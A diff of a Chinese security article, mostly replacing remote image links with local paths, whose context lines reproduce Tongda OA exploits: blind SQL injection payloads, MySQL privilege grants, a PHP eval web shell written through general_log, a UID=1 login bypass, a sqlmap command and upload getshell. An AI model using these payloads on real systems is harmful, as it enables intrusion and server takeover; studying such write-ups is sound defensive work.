@@ -54,9 +54,9 @@ schema_version: "1"
 
   
 
-![](https://mmbiz.qpic.cn/mmbiz_png/siayVELeBkzWBXV8e57JJ4OyQuuMXTfadZCia0bN2sFBfdbTRlFx0S97kyKKjic5v6eaZ8cY4WQt0UEu4dkyowHYg/640?wx_fmt=png)
+![](../../.resource/remote/e4700f2588a58a9047e7224194a9c77ff109b7d1c2764141d4fe795b98f4e2d8.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rl6daM2XiabyLSr7nSTyAzcoZqPAsfe5tOOrXX0aciaVAfibHeQk5NOfQTdESRsezCwstPF02LeE4RHaH6NBEB9Rw/640?wx_fmt=png)
+![](../../.resource/remote/af46b8914a59a6fd7ea711f37ab78ee50b3eb2f64f79fd083b21bf24ed4e3896.png)
 
 作者：掌控安全 - mss
 
@@ -72,31 +72,31 @@ schema_version: "1"
 
 inc/expired.php  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8H3WxDw84x4ibiciaHgOPyHhgNMoAXNZ1cGq44LTRNlORmGIqUQZMEVEbibQ/640?wx_fmt=png)  
+![](../../.resource/remote/f741c39371f0c0e33d65fe5886e988e3b69110397c0c624f71605c3a89485fa6.png)  
   
 
 inc/reg_trial.php
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8Hg87fywrVQ2swyoRmxCrOocvhMqybibMjcjicCpSKhqINK3nvJeqRzFPQ/640?wx_fmt=png)  
+![](../../.resource/remote/ca8857945ede64828809f9ee9c87644885d6de863eb0aa9c2452ae19d0e8b3b6.png)  
   
 
 inc\reg_trial_submit.php
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HgOx4KOlCYTLUiaZ2YLkA05JnvacYlTSGG7sO5vftIxnic3rkFelDLBiaw/640?wx_fmt=png)
+![](../../.resource/remote/5b2501d6af29e610160b4f892e52f7e04123088134becee209e5f302ab875c52.png)
 
 #### 用户名 / 邮箱收集
 
 ispirit/retrieve_pwd.php?username=admin  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HITRVOnf4F62Am2szeBicyTGInoOlH1vibIYhLZMMKaBgyBf8vUXlR5dw/640?wx_fmt=png)
+![](../../.resource/remote/2c53d6928c37dbb7c0a7668e86c2c7db5668f42a7b50c441e79ae10dee2c5d09.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8H554KKCoWWAUHkbDfIRqk9bKDwHav4fcS6SAD0CbPTqMCXkp1JQjgQA/640?wx_fmt=png)
+![](../../.resource/remote/378973687955b5ea77580b29a01bfdd3e7df4e71cd2faaf0fec73b66de8e5f49.png)
 
 #### 计算机名
 
 resque/worker.php
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HG6wFk7bKvhrzgvMribyMkbAgnsdzaX7NeXOVNONBicqkIKYoaRNAOcgQ/640?wx_fmt=png)
+![](../../.resource/remote/32e847204c3485d087d57cb31cc05155cf9d61827ef4fca3a620c51c2789ca1b.png)
 
   
 
@@ -133,9 +133,9 @@ Content-Disposition: form-data;
 
 > 请求长度说明：原资料 Content-Length 为 855；保留原始标头；其数值未据实际请求体重新计算或验证。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HSPe4TuIOHnTpFa2n9x3rRKpWVQaCfv1vsu5TsVMQ7ItMmfQHpEHFvQ/640?wx_fmt=png)  
+![](../../.resource/remote/fc1dc436c5c82237c5adadde4184c6e4e292bde9827710bcab56202e6c92a6ac.png)  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HpcN3pbiaZLZTBNAKsDibaNVGhibA0BtymSsJzHaCEPcpASrFaP6jsQ5tQ/640?wx_fmt=png)py 脚本：https://github.com/TomAPU/poc_and_exp/blob/master/rce.py
+![](../../.resource/remote/5dd2124ecb5433f3fe505ce21f583458ed6c3cdf819715663a0f6066b16647b4.png)py 脚本：https://github.com/TomAPU/poc_and_exp/blob/master/rce.py
 
   
 
@@ -151,18 +151,18 @@ Content-Disposition: form-data;
 
 构造前
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HBCreNwea7Lx1kx6I6ygbwicwqvAOVvD2FStric5gEsDtu8XvYMDFTJSw/640?wx_fmt=png)  
+![](../../.resource/remote/9e6269e0801d68469802542a3c14948425dc632ba45a96ab8830519f7aa423e0.png)  
 构造`grant all privileges ON mysql.* TO 'test'@'%' IDENTIFIED BY 'test' WITH GRANT OPTION`
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HNW4jndlxF4JoibIoBYNW0zm6SBogcicb3ZBiaZFcePu2Z011y3alfY0UQ/640?wx_fmt=png)
+![](../../.resource/remote/d00e28a542b07615661b2d6e11d950c0836140ef4a74678dab546907e2f852c7.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HzX3oS7IvlIroPqA4alKzEsmlkpW23RBjquttqUOnbY25P23RKl9FqA/640?wx_fmt=png)
+![](../../.resource/remote/319bc8540c0149a3aa6ec9b7b1480ec04337878ee5eddbe56ac6cdf3879f6cff.png)
 
 **2. 赋予权限**
 
 执行一些指令报错，给设置的账号权限
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HLbTia6b5Kfb93pvufgVEZ3roR3jfImArOHcCez2x9rdATkwcpXwLCjA/640?wx_fmt=png)  
+![](../../.resource/remote/98600faaf5578687c733f563f4c8f4e98a7ef4a0b6c7e7e1ce152e41f346b4e6.png)  
 在数据库里构造
 
 ```http
@@ -186,16 +186,16 @@ CODEUID={BED9DDBF-B3A5-ADAA-F671-9E349EAC7B5D}&UID=1
 给用户赋予超级权限，  
 在注入点构造`general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges`刷新权限后重新登录，输入`set global general_log = on;`
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HPYS7qMcd19JDCbqQ1ibxQJbcmBLX9cVPLHfrPJmwrspvOcXkibxibH9Lw/640?wx_fmt=png)
+![](../../.resource/remote/e70bd7d2f8139b5199e6068ebba671ced357827d4376cf25ede530f0c6dc1349.png)
 
 **3. 写 shell**
 
 set global general_log_file = ‘C:/toda17/webroot/1.php’;  
 select ‘<?php eval($_REQUEST[test]);?>’;
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8Hx8FyTAVjUN9WhePHCvek7opcfrU6vgNAUUuOr5IOzPZyGibT4FmC98w/640?wx_fmt=png)
+![](../../.resource/remote/f3d9591aa9db146012430fa1716d06792923ee6bedb22836dbabac705b30d341.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HoJ6icMAqicDdG68jt2ZaI9os67Hoj0HCbSa3EwYK1SYRBaZpWa4ibhQyA/640?wx_fmt=png)
+![](../../.resource/remote/ec96fa4f772de951c1c3d59ca2e2dbfe56d60d1a248983fb478bf2e71d64e24d.png)
 
 **通达 OA 11.7 后台 sql 注入 getshell 漏洞复现**
 
@@ -214,9 +214,9 @@ select ‘<?php eval($_REQUEST[test]);?>’;
   
 自行下载相关的安装包，一键安装，安装的界面如下：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8H4e27QvL5m88jA38jsej1nuI9OKSv1mC80SRcoHm4LrpAo1Nn3QCvDg/640?wx_fmt=png)
+![](../../.resource/remote/3d9de96f01d29822a518152922e512f916c38c76f3dfbe7d70944d1e8aa98e52.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HZqbVz7YnxuibH5iavCxU8tarvzjFaicWkN3JhZVe4UCRc6vbn3gPTfbyw/640?wx_fmt=png)
+![](../../.resource/remote/764583d71fa36bb401c67aac1b458bd42624ff6be77c8890fc870f4a98589d23.png)
 
 **4、漏洞复现**
 
@@ -231,26 +231,26 @@ select ‘<?php eval($_REQUEST[test]);?>’;
 
 但是回到判断 $condition_cascade 传参，这里发现传参如果不为空，又将其中的 \’替换为’ ，导致漏洞的存在。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HStAQ3ccB55ib2ceeCBNiaEEnvhsvZXlGqGvu32ic5joOqFZcY2CicPSr1Q/640?wx_fmt=png)
+![](../../.resource/remote/7cb3a3d7b2b65923560ae0f849ffb244a83a12e774aeaf11aa9ffc91affd2a3f.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8H75cgoL4xPG2EibMxFPib1PN830icnsmFh3Pe7I7wryf0WdQBCSiaCboicRg/640?wx_fmt=png)
+![](../../.resource/remote/37a571dfe12f40c5ec81247581cdc9a34626e25b7a2295a8ccd758380b37a9b3.png)
 
 接下来对其进行测试。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HdLrIcgEnvd0I9Y4Fd5egVGunQET411o0x9QXohUZp07DQFNLH9QSMw/640?wx_fmt=png)  
+![](../../.resource/remote/fd2246e8d475a43927faac44a9f869957eaa4de1a231504c28bedcbc0c7c1195.png)  
 我们发现直接进行访问是行不通的，所以这里有一个限制条件，需要一个账号进行登录，我们搭建的时候默认的账号是 admin，密码是空，先进行登录
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8Hy1tBMuSdJWlrAz9kRiarZjJAM90xtEnOtxs1RAiaYnhsBia43WDOZM9aA/640?wx_fmt=png)  
+![](../../.resource/remote/de86e08d545ed188dce1e9517f40ed3ea22db9d25b8a1957bbbc79be0ee955d7.png)  
 这个是正常的页面，接下来我们对其 condition_cascade 传参进行布尔盲注测试
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8H7hrQlYXqbNmWRBDfTZkIib1ImNticV4xCcm23hUpNzFLsA0R40BBfwmA/640?wx_fmt=png)
+![](../../.resource/remote/b338c5db8e064a2da09ba42a85cbfa6d3cc865565ecb30786b0b521eefe070de.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8H6P7YpBmzIc667DJvyyvMnSGMAic8uBeWMB7MW9Vn5FUpPGRJjNYic9gg/640?wx_fmt=png)  
+![](../../.resource/remote/16395f94e7085269f2cc3d6ed5034e5f492bf44d729ff65132ac32822c073421.png)  
 这时候我们好像遇到了困难，输入的语句中存在 sleep 的时候触发了通达 OA 的安全验证机制，为了更好的绕过，我们去看看源代码中的安全检测机制，
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HibWfUUNcHXrib8JCkoOd1To7zybggI12FgrJHN6GWjFN0mtiapdMeSWmQ/640?wx_fmt=png)
+![](../../.resource/remote/75a2ede5ac029df1795f71660ea226db78bbc0ba0240ec47ab180521ed7474eb.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8Hy4Ip7OHuOgz6ibfMsW2FOosIBJyibjrAcSxzDaibE25V50jAK9P6R5xQg/640?wx_fmt=png)
+![](../../.resource/remote/a4ced62945dce3b84a4a4efda2436a11780e160fb88fe7057a4b2e52089ca2b2.png)
 
 这里我们发现只是过滤了一些字符，并非无法进行绕过，盲注的核心是：substr、if、Left 等函数，这些均未被过滤，所以我们可以考虑从这些入手。
 
@@ -260,36 +260,36 @@ select ‘<?php eval($_REQUEST[test]);?>’;
 所以构造语句：  
 select%20if((substr((select%20user()),1,1)=%27r%27),1,power(6666,666));
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HazMafBTsu09NdZwOVv5s0zhMMy4ZSCyKcacXbWicqhIGxhJ4kusQ89A/640?wx_fmt=png)
+![](../../.resource/remote/0221cacdb650ce555bb1b5b562c1caa07cff62100fba36b7222a5c08339c69e8.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HjHYNjy68Y94GhSjDojJbjynheQrF013yetBCVzEhEwj7hoVoLp3D9g/640?wx_fmt=png)
+![](../../.resource/remote/a054b286852549e39226f1a7412911254e3e6df74a9e8c8529737e64a163c71d.png)
 
 构造利用链达到 getshell  
 传参处尝试进行用户的添加
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8H4kgib8iaCdueC2MVOctnz2OLibQibJaPmdKibfFYvtibW8fibFTKR4YHvPzuQ/640?wx_fmt=png)  
+![](../../.resource/remote/6522194f4bc50bdf892bedbc5a1751ab8daf40b3e72bfdda9413beb9833bc3db.png)  
 进行连接试试
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HbXtibpZAvELhJaicaIiaQahvZDSFbfGnTq2GYrphw9FerVwNJghib3otXg/640?wx_fmt=png)
+![](../../.resource/remote/b701a56181cb5d1d58948746ee896c8e2381ef7bc9ab6236d28ec05d5276b39f.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HyrBk4ZosNb2pr7ia9VEWzou8cRGmjsvj25qRhzEVKUSjYXN59BgyjJw/640?wx_fmt=png)  
+![](../../.resource/remote/7e8ab61834f1c625337a63143a881f0dc20d4520e365849356786fce45e2e865.png)  
 发现添加成功了，这个时候我们就会给用户相应的权限，这里在数据库中进行对该用户赋予超级权限，UPDATE`mysql`.`user` SET `Super_priv` = ‘Y’ WHERE `User` = ‘test123’  
 接着我们在注入点进行权限的刷新 condition_cascade=flush privileges;
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HyOULN4E985kvBGPvVPuWQzeCbpJVn45Av02o8jQzziajUdUL8uB7Hwg/640?wx_fmt=png)  
+![](../../.resource/remote/afbd3d3f303a335f22d05f97b11a179284b008039e9d15db206d921c4738f849.png)  
 重新登录之后我们知道写 shell 需要知道一定的路径，这个时候我们可以先查看一下路径，我们只是进入了数据库，可以根据数据库的信息进行猜测
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HlDVGOicibzMNVCfYOaR50cHq2OR54rCibRqPam3aickGEJg0fyBUIy7y0A/640?wx_fmt=png)  
+![](../../.resource/remote/75a777396ffa7950b46121e5795eb2912a7557665899b81479f7d68603625db3.png)  
 这个时候我们可以知道根目录是 OA17  
 接着对其进行写 shell 操作  
 set global general_log = on;  
 set global general_log_file = ‘C:/OA17/webroot/1.php’;  
 select ‘<?php eval($_POST[8]);?>’;
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HvfkhgUuZR6nAibYB4ibB7szxke0lsXx4O1vM2Uwz1tiaqHeFXs51ib8xibQ/640?wx_fmt=png)  
+![](../../.resource/remote/60e063e46819dc5e3fcb33b7d1e7c66e867ddb82fa28b7566e47ea45c33ebd94.png)  
 成功写入，连蚁剑
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HgP8hIGiacsWp5cfUxUhrSfAfuiaQA8q06iaibN9BBQMHEybicaeR8pd6DkQ/640?wx_fmt=png)  
+![](../../.resource/remote/6f44966307b73204365afaaa9e2dc87893bee78d169ab9850826b6c0bf544e27.png)  
 成功 getshell!
 
   
@@ -314,12 +314,12 @@ URL:`general/appbuilder/web/report/repdetail/edit?link_type=false&slot={}&id=2*`
   
 sqlmap:`python3 sqlmap.py -u "xxxx.com/general/appbuilder/web/report/repdetail/edit?link_type=false&slot={}&id=2*" --cookie="你的cookie"`
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HCADPNGZuUwke31c4TjWdvq99S2OGMfhtQYE4n4ISwC2os2FEFq8Utw/640?wx_fmt=png)
+![](../../.resource/remote/d17010f08521f06184c852b46714daafac994a3b188bd9f9ef2d4cba6201736b.png)
 
 **查询日程处 sql 注入**
 ----------------
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HPOdBcAgxCOaP7fkJPDA8J9luibQrLyBLDDzld7J38Hl4IlpgjiamYfaA/640?wx_fmt=png)  
+![](../../.resource/remote/fbc64479b22185efa2bfab730803d04d51e3a2220ee6e86a7c900dcfeb49d97c.png)  
 条件：需要账号  
 POST 包：
 
@@ -358,7 +358,7 @@ version < 11.5 未授权访问 & 文件上传
 
 1. 访问`general/login_code.php`
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HHSeDJCMVdzxymPqOv9raDKBS6vTiajGWPMLfibebKM7jt6CuJvnYKpfA/640?wx_fmt=png)
+![](../../.resource/remote/f284024ec88d268dce4e26a8bdd2c0b5b12efd3b896441582b7845dc8d43097d.png)
 
   
 得到 code_uid:`BED9DDBF-B3A5-ADAA-F671-9E349EAC7B5D`
@@ -383,7 +383,7 @@ CODEUID={BED9DDBF-B3A5-ADAA-F671-9E349EAC7B5D}&UID=1
 
 2. 替换 cookie，访问`general/index.php?is_modify_pwd=1`
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8H7dWQKxlKcB4bumIF8bwycxQPiaVUKJib3IMRN1EQOktUJueRFRu0ibN2Q/640?wx_fmt=png)
+![](../../.resource/remote/6afd8152c764ff195a1db1a34711e4741a4aa3246eb0b387ff2062038368a936.png)
 
 构造如下数据包
 
@@ -402,7 +402,7 @@ Content-Disposition: form-data;
 --abc--
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HpcN3pbiaZLZTBNAKsDibaNVGhibA0BtymSsJzHaCEPcpASrFaP6jsQ5tQ/640?wx_fmt=png)  
+![](../../.resource/remote/5dd2124ecb5433f3fe505ce21f583458ed6c3cdf819715663a0f6066b16647b4.png)  
 
   
 
@@ -429,9 +429,9 @@ Content-Disposition: form-data;
 
 自行下载相关的安装包，一键安装，这里以 V11.3 版本为例，安装的界面如下：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HkO3lhU0w9l2o3Yr8QzKo4TSozEs4rpEsHY5cZw4gp5M68NKNmPKkkg/640?wx_fmt=png)
+![](../../.resource/remote/fed3717a5793e2e5a1bdc973faa2334e13e9fbc06f5ac0661056608c4f35e1e1.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HH4PMLAlI1Uc2VGZ5gicUU43NtUbTZ0B3vicoplREZlib6GycXDyHKPIjQ/640?wx_fmt=png)
+![](../../.resource/remote/26175990257434e8e7cae1dbbba471d3f5502ee7f0c23049bd162cb779736ee0.png)
 
 **5、漏洞复现**
 
@@ -439,11 +439,11 @@ Content-Disposition: form-data;
 
 我们刚刚开始的时候如果访问这个链接页面的时候我们发现是没有权限的
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8Hwh2LMibxWbl6A6xmmt3aVOI2KnrXhKk9CM8deRV94o8BMpibiavHTMN6Q/640?wx_fmt=png)
+![](../../.resource/remote/9f8c3b0f1f145c97d5a22895504a87b7f29cbd32772e8819f1415af5c9c0d84b.png)
 
 接着我们去到我们的登录页面进行抓包分析，看是否存在验证身份的传参  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HK2zicEt0bQQicDxmLCtCgYAAtBibewicz6j1ve25nOqeqnEdhzUiaQk73Ng/640?wx_fmt=png)
+![](../../.resource/remote/24b52191d20481196440f6ee0604a792d13b39b8c15b449a228c34b6581d2892.png)
 
 我们发现是不存在什么验证身份信息的，但是我们可以看到有 PHPSESSID,
 
@@ -451,17 +451,17 @@ Content-Disposition: form-data;
 
 我们正常登录的时候我们会发现会跳转至 logincheck.php
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8Hfjn9qlMRU2QNRe9T5GXG01ndK1XjbeiauvJWRen2MRnL1qSsDAMgOsg/640?wx_fmt=png)
+![](../../.resource/remote/bcedbb24ed7194d349e62e7a12db142de8f20b15a9af6de160748515274eba05.png)
 
 我们可以去到源码分析，发现源码加密了，这里用软件 SeayDzend.exe 进行解密，接着发现 logincheck.php 引用了 logincheck_code.php 进行身份验证
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HuUibMGl30XibcViaWdXYEqN8RO3ADvvMzkvHHRicDLFOeGUm6Mp65gNgBg/640?wx_fmt=png)
+![](../../.resource/remote/9d486fc181d6be07eccadd835447f63031415e8bbded4ea327704c46c37dd6fc.png)
 
 分析发现这里直接获取 POST[‘UID’] 参数，然后直接带进 SQL 语句查询，这里没有去验证用户密码，这里猜测 UID 是什么的时候是管理员，我们这里可以进入 mysql5 目录，
 
 查看 my.ini 获取密码，进入 TO_OA 数据库，查询上述语句 SELECT * from USER where UID=’$UID’，查看结果发现 UID 为 1 的时候是管理员用户。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HqG029YEpAR1Jq2icJ6D7c4z148ugCvuJD3ONU5soAicHoWrnXC05Qd6A/640?wx_fmt=png)
+![](../../.resource/remote/370856897418eee6564897ff029e30b53e6f2990ee11b17b6e61d208de7ce433.png)
 
 我们继续往下看，当我们在 logincheck_code.php 中 POST 传入 UID=1 的时候，
 
@@ -469,60 +469,60 @@ Content-Disposition: form-data;
 
 将直接返回 admin 认证的 SESSION 到当前的这时可以带着当前的 SESSION 到 / general/index.php 中，直接是 admin 管理员用户
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HhyXDO61sibSX3micA4uoPTa1T387IM9fnqa5e7mJONZNP84ILC8UiaSPw/640?wx_fmt=png)
+![](../../.resource/remote/570bf481fb59d7e4345e92a34d96dae88e30e7aacdc897dfa9eb40bfb75c0c81.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HViacuLLVfXF9cCcAyt92tHS2mdEkUMkl4m3JKCc0Z94bIPvUK0P1Oaw/640?wx_fmt=png)
+![](../../.resource/remote/681d532159290f6bb1969e9e135cc07eae7084ee8cbf67f68bfce53babf3fd8e.png)
 
 这个时候我们可以去抓包进行复现刚才的思路
 
 首先更改登录包进行获取 PHPSESSID
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HoRicG4xLudxQQjEL5wGSL5InynMg7rVj0aGBbWZ729y5fkgLcKdD8EA/640?wx_fmt=png)
+![](../../.resource/remote/7a80fee01c3fee98d3f3811de043e2d33224a255629dfc10f3324cc2c5db547e.png)
 
 接着把 PHPSESSID 放入到 / general/index.php 目录下的页面进行未经授权登录
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HFzBcpxtQBRJmh6eIQIyEVLFqRqN3IsHPLpsp0KeYBxezxKZBgqLHqQ/640?wx_fmt=png)
+![](../../.resource/remote/b1f0b01636816a3f513a162680f439519fbc6462698c46eff0bb0733dfaefcea.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8Hz8zicTqlUtImrnwUnfUCWTsh4HlSjK4icWsmKItVoLCCwFiaNQiboByLJg/640?wx_fmt=png)
+![](../../.resource/remote/5ac047a462d920d02829be01942837743a619ac35e82c5ca174a8eb0abf47930.png)
 
 **6、进阶 - 后台 GETSHELL**
 
 找到菜单中的附件管理，如果没有存储目录的需要自己添加
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8H7iaL2aLJQACFFSVoxkRqpUbo7ZZncxfL4soWoicuS32coRsFcPFq8eAQ/640?wx_fmt=png)
+![](../../.resource/remote/a9746693319991f684f1626492dae28edc428ee0e4f7d803bea6beba9763e587.png)
 
 之后找到组织中的系统管理员，打开聊天窗口，我们发现有一个发送文件的地方，
 
 而发送成功之后的文件会存储在我们刚才设置好的目录中
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HQO12qrSvhz0oribd5ZjUhEK1lLDKb4BVxvia1L3icpo5IicsGo8U2XbicDQ/640?wx_fmt=png)
+![](../../.resource/remote/9687020ef33e56529831632445c845042f0768f5acf26895f6e11c811d297412.png)
 
 这里进行文件传输的时候我们可以进行抓包，我们发现存储的位置就是我们设置的目录
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8Hb9vtyCb9rqLHnj0FWic6sako4BFwY0Oia6rSPia1cqyeT7AibwRkvfwZmA/640?wx_fmt=png)
+![](../../.resource/remote/65ec3289fdec1cbec369ac3f8c52b5dcbbbda513e5bc3be9753887f128b195ac.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HX4NtIicTl9ia6icsaQRxjYBWfDQP2WBHzGENibPrgVZXrZanJTuyMfRia8A/640?wx_fmt=png)
+![](../../.resource/remote/9235a596733c9544ba882bcf33d447bd3742ce81b3ec62ca66e0a9e8836d76de.png)
 
 这个是我们发现会更改文件的命名，但是我们抓包的时候发送数据包时会返回重命名文件和路径
 
   
 这个时候我们是否可以直接传输小马，试一试
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HKFIzxb1QmUlPr7KESAY8XytiaNArGhNTr1bOJQs28tib3ibT6HnxYkL7Q/640?wx_fmt=png)
+![](../../.resource/remote/f38aa119eb12c98a710f23d581cc1a4ef355f96435d8e4a5796e25d5916a178a.png)
 
 接着我们就可以直接上蚁剑进行连接啦
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8H2Xo87znPFE1B4sPtrhDyibultrSI4URib5aSdicPdJgd3HYewC3Ayag4Q/640?wx_fmt=png)  
+![](../../.resource/remote/242954041a38ba3d4ddb5e1d53cbde7b6b0a9d7f0cbc97e61a4c3fc6fbd94f1f.png)  
 成功 getshell
 
 有时候我们总会嫌弃手工注入太繁琐，这里我们依旧可以用脚本得到 PHPSESSID  
 usage: python 3 poc.py -v {11,2017} -url TARGETURL
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HR99EsXndicVqh5yIuV748AQYumepDia7o5bf9Wy2Ze5fWvCjqNUh6xQg/640?wx_fmt=png)
+![](../../.resource/remote/a5f8d769e96fd845d133ca2ddb156222cbbee6f232edc319f688323d4fa214fa.png)
 
 我们将得到的 PHPSESSID 直接放到 COOKIE 中，我们发现依旧是可以直接进行未授权登录的
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8Hz8zicTqlUtImrnwUnfUCWTsh4HlSjK4icWsmKItVoLCCwFiaNQiboByLJg/640?wx_fmt=png)
+![](../../.resource/remote/5ac047a462d920d02829be01942837743a619ac35e82c5ca174a8eb0abf47930.png)
 
 **8、修复建议：**
 
@@ -547,13 +547,13 @@ usage: python 3 poc.py -v {11,2017} -url TARGETURL
 [实战纪实 | 从编辑器漏洞到拿下域控 300 台权限](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487476&idx=1&sn=ac9761d9cfa5d0e7682eb3cfd123059e&chksm=fa687685cd1fff93fcc5a8a761ec9919da82cdaa528a4a49e57d98f62fd629bbb86028d86792&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif)
+![](../../.resource/remote/553ceefc3b1479cc862f6f8900857ffa3da4352fd66ccb41e13c9b73baff07fa.gif)
 
 扫码白嫖视频 + 工具 + 进群 + 靶场等资料
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpx1Q3Jp9iazicHHqfQYT6J5613m7mUbljREbGolHHu6GXBfS2p4EZop2piaib8GgVdkYSPWaVcic6n5qg/640?wx_fmt=png)
